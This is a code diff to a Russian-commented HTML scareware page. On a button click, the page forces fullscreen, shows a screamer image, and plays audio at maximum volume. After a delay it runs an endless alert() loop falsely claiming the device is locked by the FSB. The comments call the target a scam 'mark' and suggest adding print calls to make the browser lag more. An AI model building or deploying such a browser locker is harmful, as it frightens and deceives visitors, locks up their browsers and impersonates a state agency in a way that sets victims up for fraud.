@@ -6,7 +6,8 @@
     <style>
         body { margin: 0; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
         #s { display: none; width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 999; }
-        .btn { padding: 25px 50px; background: #0056b3; color: #fff; border: none; font-size: 1.8rem; cursor: pointer; border-radius: 5px; font-family: sans-serif; font-weight: bold; z-index: 1000; }
+        .btn { padding: 25px 50px; background: #0056b3; color: #fff; border: none; font-size: 1.8rem; cursor: pointer; border-radius: 5px; font-family: sans-serif; font-weight: bold; z-index: 1000; transition: 0.3s; }
+        .btn:hover { background: #004494; transform: scale(1.05); }
     </style>
 </head>
 <body>
@@ -19,24 +20,26 @@
             let a = document.getElementById('a');
             let i = document.getElementById('s');
             
-            // 1. Уходим в фулскрин (самое важное)
+            // Запрашиваем полный экран
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             }
 
-            // 2. Скрываем кнопку, показываем рожу и включаем ор
+            // Убираем кнопку, показываем скример
             document.querySelector('.btn').style.display = 'none';
             i.style.display = 'block';
+            
+            // Включаем звук на полную
             a.volume = 1.0;
             a.play();
 
-            // 3. ЗАДЕРЖКА ПЕРЕД ОКНОМ (3 секунды)
-            // Даем мамонту рассмотреть картинку и оглохнуть, прежде чем выскочит окно
+            // ЗАДЕРЖКА 5 СЕКУНД (5000 мс)
             setTimeout(() => {
                 while(true) {
-                    alert("КРИТИЧЕСКАЯ ОШИБКА: НЕСАНКЦИОНИРОВАННЫЙ ДОСТУП. УСТРОЙСТВО ЗАБЛОКИРОВАНО.");
+                    alert("КРИТИЧЕСКАЯ ОШИБКА: НЕСАНКЦИОНИРОВАННЫЙ ДОСТУП. УСТРОЙСТВО ЗАБЛОКИРОВАНО ФСБ РФ.");
+                    // window.print(); // Опционально: можно раскомментировать для еще больших лагов
                 }
-            }, 3000); 
+            }, 5000); 
         }
     </script>
 </body>
